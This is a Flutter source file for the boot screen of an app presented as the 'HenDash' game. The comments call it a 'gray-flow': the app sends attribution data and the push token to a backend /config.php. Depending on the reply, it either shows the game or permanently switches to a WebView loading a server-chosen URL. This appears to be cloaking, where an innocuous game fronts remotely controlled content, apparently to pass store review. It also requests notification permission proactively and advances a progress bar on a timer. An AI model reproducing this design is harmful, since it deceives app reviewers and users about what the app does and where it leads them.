import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../data/run_mode.dart';
import '../net/attribution_hub.dart';
import '../net/backend_gate.dart';
import '../net/net_sensor.dart';
import '../net/push_courier.dart';
import '../vault/prefs_vault.dart';
import '../screens/menu_screen.dart';
import 'offline_notice_page.dart';
import 'push_invite_page.dart';
import 'portal_stage.dart' deferred as portal;

// ============================================================
// BootStage — first screen the user sees; decides gray/white.
// ============================================================
// The visual side keeps the HenDash yellow loading art (loading_vert.png
// / loading_hor.png) with the horizontal progress bar the user already
// approved.  The behavioural side runs the gray-flow state machine:
//
//   RunMode.fresh
//     · If we're offline → OfflineNoticePage.
//     · Ignite AttributionHub, wait for attribution + deep-link, POST
//       to /config.php.
//     · ok+url  → RunMode.webview → PushInvitePage (or PortalStage).
//     · otherwise → RunMode.game → MenuScreen.
//
//   RunMode.webview
//     · Push URL in the vault takes precedence — open PortalStage.
//     · Otherwise ignite AttributionHub, refresh, then PortalStage.
//     · Fall back to saved URL on network failure.
//
//   RunMode.game
//     · Skip the whole gray-flow.  Straight into MenuScreen.
//
// The loading UI is intentionally a *progress bar* (not a video) so
// this build renders identically on devices that can't decode webm/mp4.
// ============================================================

class BootStage extends StatefulWidget {
  const BootStage({
    super.key,
    required this.vault,
    required this.netSensor,
    required this.attributionHub,
    required this.backendGate,
    required this.pushCourier,
  });

  final PrefsVault vault;
  final NetSensor netSensor;
  final AttributionHub attributionHub;
  final BackendGate backendGate;
  final PushCourier pushCourier;

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage> with TickerProviderStateMixin {
  late final AnimationController _dotsCtrl;
  late final AnimationController _pulseCtrl;
  late final AnimationController _progressCtrl;
  Timer? _creepTimer;
  bool _handedOff = false;

  @override
  void initState() {
    super.initState();

    // Allow both orientations on the boot screen — the artwork ships in
    // vertical and horizontal variants.
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);

    _dotsCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..repeat();
    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1400),
    )..repeat(reverse: true);
    _progressCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 700),
      value: 0.0,
    );

    _routeAfterBoot();
  }

  // -------- Progress bar helpers ---------------------------------------
  //
  // The ribbon fills left → right through discrete stage targets that
  // mirror the actual gray-flow work (network probe → attribution →
  // gate → …).  Each transition rides on an AnimationController.animateTo
  // so the sweep is smooth and always visible — no more sitting at 0.
  //
  // Between stages a very slow "creep" timer nudges the fill by ~0.4%
  // per second toward the next target.  On a slow backend call this
  // makes the bar tick forward gently instead of freezing.  The final
  // [_finishProgress] sweeps whatever remains to 100% just before we
  // hand off to another screen — matching the "fills completely ONLY
  // at the moment of launch" requirement.

  double _pendingCeiling = 0.0;

  void _startCreep() {
    _creepTimer?.cancel();
    _creepTimer =
        Timer.periodic(const Duration(milliseconds: 250), (_) {
      if (!mounted) return;
      if (_progressCtrl.isAnimating) return;
      // Stop creeping ~2% below the current stage target so the next
      // _stageTo call still has visible room to animate.
      final ceiling = (_pendingCeiling - 0.02).clamp(0.0, 1.0);
      if (_progressCtrl.value >= ceiling) return;
      final next = (_progressCtrl.value + 0.006).clamp(0.0, ceiling);
      _progressCtrl.value = next;
    });
  }

  Future<void> _stageTo(double target) async {
    final clamped = target.clamp(0.0, 1.0);
    _pendingCeiling = clamped;
    if (_progressCtrl.value >= clamped) return;
    await _progressCtrl.animateTo(
      clamped,
      duration: const Duration(milliseconds: 550),
      curve: Curves.easeOutCubic,
    );
  }

  Future<void> _finishProgress() async {
    _creepTimer?.cancel();
    _pendingCeiling = 1.0;
    if (_progressCtrl.value >= 0.999) return;
    await _progressCtrl.animateTo(
      1.0,
      duration: const Duration(milliseconds: 900),
      curve: Curves.easeOutCubic,
    );
    await Future<void>.delayed(const Duration(milliseconds: 220));
  }

  // -------- Routing -----------------------------------------------------

  Future<void> _routeAfterBoot() async {
    _startCreep();
    await _stageTo(0.08);

    // Wire push courier + token rotation callback FIRST so late
    // callbacks fired while attribution is still running still land.
    widget.pushCourier.onTokenRotated = _onTokenRotated;
    await widget.pushCourier.wire().catchError((_) {});
    await _stageTo(0.22);

    switch (widget.vault.mode) {
      case RunMode.game:
        await _stageTo(0.55);
        // Game-only users never see PushInvitePage, so request the OS
        // notification permission proactively — otherwise Android 13+
        // silently drops every subsequent push.
        await _ensurePushPermissionSilently();
        await _stageTo(0.85);
        await _finishProgress();
        _handOffToGame();
        return;

      case RunMode.webview:
        await _routeReturningOnline();
        return;

      case RunMode.fresh:
        await _routeFirstLaunch();
        return;
    }
  }

  Future<void> _ensurePushPermissionSilently() async {
    if (widget.vault.pushGranted) return;
    if (widget.vault.pushOsBlocked) return;
    try {
      await widget.pushCourier.askPermission();
    } catch (_) {}
  }

  Future<void> _routeFirstLaunch() async {
    final online = await widget.netSensor.isOnline();
    await _stageTo(0.32);
    if (!online) {
      await _finishProgress();
      _handOffOffline();
      return;
    }
    await widget.attributionHub.ignite();
    await _stageTo(0.48);
    await Future.wait([
      widget.attributionHub.awaitAttribution(),
      widget.attributionHub.awaitDeepLink(),
    ]);
    await _stageTo(0.68);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attributionHub.assembleBody(
      locale: locale,
      pushToken: widget.pushCourier.token,
    );
    final reply = await widget.backendGate.negotiate(body);
    await _stageTo(0.85);

    if (reply.ok && reply.hasUrl) {
      await widget.vault.setMode(RunMode.webview);
      await _finishProgress();
      _handOffToPortal(reply.url!);
    } else {
      await widget.vault.setMode(RunMode.game);
      // No PushInvitePage on this branch — grab OS permission here so
      // notifications keep flowing even for game-only players.
      await _ensurePushPermissionSilently();
      await _finishProgress();
      _handOffToGame();
    }
  }

  Future<void> _routeReturningOnline() async {
    final online = await widget.netSensor.isOnline();
    await _stageTo(0.32);

    // 1. Push URL wins over everything.
    final pushUrl = await widget.vault.readAndClearPushUrl();
    if (pushUrl != null && pushUrl.isNotEmpty) {
      await _finishProgress();
      _handOffToPortal(pushUrl);
      return;
    }

    if (!online) {
      final cached = await widget.backendGate.cachedUrl();
      await _finishProgress();
      if (cached != null && cached.isNotEmpty) {
        // Still show offline first — if the WebView starts on a dead
        // network it will crash into the black error page.
        _handOffOffline();
      } else {
        _handOffOffline();
      }
      return;
    }

    await widget.attributionHub.ignite();
    await _stageTo(0.48);
    await Future.wait([
      widget.attributionHub
          .awaitAttribution(deadline: const Duration(seconds: 10)),
      widget.attributionHub.awaitDeepLink(),
    ]);
    await _stageTo(0.68);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attributionHub.assembleBody(
      locale: locale,
      pushToken: widget.pushCourier.token,
    );
    final reply = await widget.backendGate.negotiate(body);
    await _stageTo(0.85);

    await _finishProgress();

    if (reply.ok && reply.hasUrl) {
      _handOffToPortal(reply.url!);
      return;
    }
    final cached = await widget.backendGate.cachedUrl();
    if (cached != null && cached.isNotEmpty) {
      _handOffToPortal(cached);
    } else {
      _handOffOffline();
    }
  }

  Future<void> _onTokenRotated(String newToken) async {
    // Re-negotiate the backend so the freshly minted token reaches it.
    try {
      final locale = Platform.localeName.replaceAll('-', '_');
      final body = await widget.attributionHub.assembleBody(
        locale: locale,
        pushToken: newToken,
      );
      await widget.backendGate.negotiate(body);
    } catch (_) {}
  }

  // -------- Handoffs ----------------------------------------------------

  void _handOffToGame() {
    if (_handedOff || !mounted) return;
    _handedOff = true;
    Navigator.of(context).pushReplacement(
      PageRouteBuilder<void>(
        transitionDuration: const Duration(milliseconds: 350),
        pageBuilder: (_, _, _) => const MenuScreen(),
        transitionsBuilder: (_, anim, _, child) =>
            FadeTransition(opacity: anim, child: child),
      ),
    );
  }

  Future<void> _handOffToPortal(String url) async {
    if (_handedOff || !mounted) return;
    _handedOff = true;
    await portal.loadLibrary();
    await portal.primePortalEngine();
    if (!mounted) return;

    if (widget.vault.shouldOfferPush()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => PushInvitePage(
            vault: widget.vault,
            courier: widget.pushCourier,
            netSensor: widget.netSensor,
            contentUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => portal.PortalStage(
            initialUrl: url,
            vault: widget.vault,
            courier: widget.pushCourier,
            netSensor: widget.netSensor,
          ),
        ),
      );
    }
  }

  void _handOffOffline() {
    if (_handedOff || !mounted) return;
    _handedOff = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (_) => OfflineNoticePage(
          retryBuilder: (_) => BootStage(
            vault: widget.vault,
            netSensor: widget.netSensor,
            attributionHub: widget.attributionHub,
            backendGate: widget.backendGate,
            pushCourier: widget.pushCourier,
          ),
        ),
      ),
    );
  }

  // -------- Lifecycle ---------------------------------------------------

  @override
  void dispose() {
    _creepTimer?.cancel();
    _progressCtrl.dispose();
    _dotsCtrl.dispose();
    _pulseCtrl.dispose();
    widget.pushCourier.onTokenRotated = null;
    super.dispose();
  }

  // -------- Rendering ---------------------------------------------------

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFFFCC33),
      body: LayoutBuilder(
        builder: (context, constraints) {
          final isPortrait = constraints.maxHeight >= constraints.maxWidth;
          final backdrop = isPortrait
              ? 'assets/loading_vert.png'
              : 'assets/loading_hor.png';
          return Stack(
            fit: StackFit.expand,
            children: [
              Image.asset(
                backdrop,
                fit: BoxFit.cover,
                width: constraints.maxWidth,
                height: constraints.maxHeight,
              ),
              Positioned(
                left: 0,
                right: 0,
                bottom: constraints.maxHeight * 0.08,
                child: AnimatedBuilder(
                  animation: _progressCtrl,
                  builder: (_, _) {
                    final progress = _progressCtrl.value;
                    return Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        _AnimatedDots(
                          controller: _dotsCtrl,
                          percent: (progress * 100).round(),
                        ),
                        const SizedBox(height: 16),
                        Padding(
                          padding: EdgeInsets.symmetric(
                            horizontal: constraints.maxWidth * 0.12,
                          ),
                          child: _RibbonProgress(
                            progress: progress,
                            pulse: _pulseCtrl,
                          ),
                        ),
                      ],
                    );
                  },
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}

class _AnimatedDots extends StatelessWidget {
  const _AnimatedDots({required this.controller, required this.percent});
  final AnimationController controller;
  final int percent;

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, _) {
        final phase = (controller.value * 4).floor() % 4;
        final dots = '.' * phase;
        // Two-line label: "Loading..." above the live percentage.  The
        // percent number always mirrors the ribbon fill so the user
        // sees the exact same value the bar draws.
        return Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Loading$dots',
              style: const TextStyle(
                fontSize: 24,
                fontWeight: FontWeight.w800,
                color: Colors.white,
                letterSpacing: 1.4,
                shadows: [
                  Shadow(
                    color: Color(0xAA5B3A00),
                    offset: Offset(0, 2),
                    blurRadius: 4,
                  ),
                ],
              ),
            ),
            const SizedBox(height: 4),
            Text(
              '$percent %',
              style: const TextStyle(
                fontSize: 20,
                fontWeight: FontWeight.w700,
                color: Color(0xFFFFF3D2),
                letterSpacing: 1.0,
                shadows: [
                  Shadow(
                    color: Color(0xAA5B3A00),
                    offset: Offset(0, 2),
                    blurRadius: 4,
                  ),
                ],
              ),
            ),
          ],
        );
      },
    );
  }
}

class _RibbonProgress extends StatelessWidget {
  const _RibbonProgress({required this.progress, required this.pulse});
  final double progress;
  final AnimationController pulse;

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: pulse,
      builder: (_, _) {
        final glow = 0.35 + pulse.value * 0.35;
        return Container(
          height: 24,
          decoration: BoxDecoration(
            color: const Color(0xFF3B2100),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: Colors.white, width: 3),
            boxShadow: [
              BoxShadow(
                color: const Color(0xFFFF9900).withValues(alpha: glow),
                blurRadius: 12,
                offset: const Offset(0, 4),
              ),
              const BoxShadow(
                color: Color(0x66000000),
                blurRadius: 6,
                offset: Offset(0, 3),
              ),
            ],
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(10),
            child: Align(
              alignment: Alignment.centerLeft,
              child: FractionallySizedBox(
                widthFactor: progress.clamp(0.0, 1.0),
                child: const DecoratedBox(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [Color(0xFFFFEA7A), Color(0xFFFF8A00)],
                    ),
                  ),
                ),
              ),
            ),
          ),
        );
      },
    );
  }
}
